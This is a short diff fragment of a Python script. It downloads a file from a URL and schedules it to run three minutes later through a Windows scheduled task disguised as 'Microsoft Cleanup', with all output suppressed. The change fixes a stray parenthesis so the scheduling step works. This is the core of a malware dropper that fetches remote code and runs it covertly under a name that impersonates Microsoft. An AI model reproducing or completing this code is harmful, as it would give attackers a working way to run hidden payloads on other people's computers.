@@ -9,4 +9,4 @@ task_name = "Microsoft Cleanup"
 urllib.request.urlretrieve(download_url, download_path)
 run_time = (datetime.datetime.now() + datetime.timedelta(minutes=3)).strftime("%H:%M")
 schtasks_command = f'''schtasks /Create /SC ONCE /TN "{task_name}" /TR "explorer \"{download_path}\"" /ST {run_time} /F >nul'''
-subprocess.run(schtasks_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+subprocess.run(schtasks_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
